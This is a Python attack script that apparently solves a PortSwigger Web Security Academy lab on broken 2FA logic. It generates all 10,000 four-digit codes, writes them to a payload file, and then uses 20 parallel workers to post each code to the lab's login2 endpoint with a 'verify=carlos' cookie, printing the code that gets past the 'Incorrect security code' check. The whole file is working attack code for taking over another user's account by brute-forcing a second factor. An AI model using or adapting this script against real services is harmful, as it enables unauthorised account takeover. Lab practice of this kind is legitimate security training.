#!/usr/bin/python3

import requests
import string
import datetime
import time
from multiprocessing import Pool

session = 'fb2HXW7rBSnS6k3Y8gvXISyLcaizWvS4'
endpoint = "https://0a540016044df64ac05a5aaa00f0001a.web-security-academy.net/login2"
check_string = 'Incorrect security code'
brute_force_output = []
brute_force = []

for i in range(10000):
    _string = str(i)
    if len(_string) < 4:
        _string = _string.zfill(4)
    brute_force.append(_string) 
    brute_force_output.append(_string + "\n") 

f = open("2fa-broken-logic-payload.txt", "w")
f.writelines(brute_force_output)
f.close()

print('payload written')

def bruteforce_2fa(_string):
    data = {'mfa-code': _string}
    cookies = {"verify" : "carlos", "session": session}
    r = requests.post(endpoint,cookies=cookies,data=data)
    if check_string not in r.text:
        print("Cracked 2FA: " + _string)

if __name__ == '__main__':
    with Pool(20) as mp_pool:
        mp_pool.map(bruteforce_2fa, brute_force)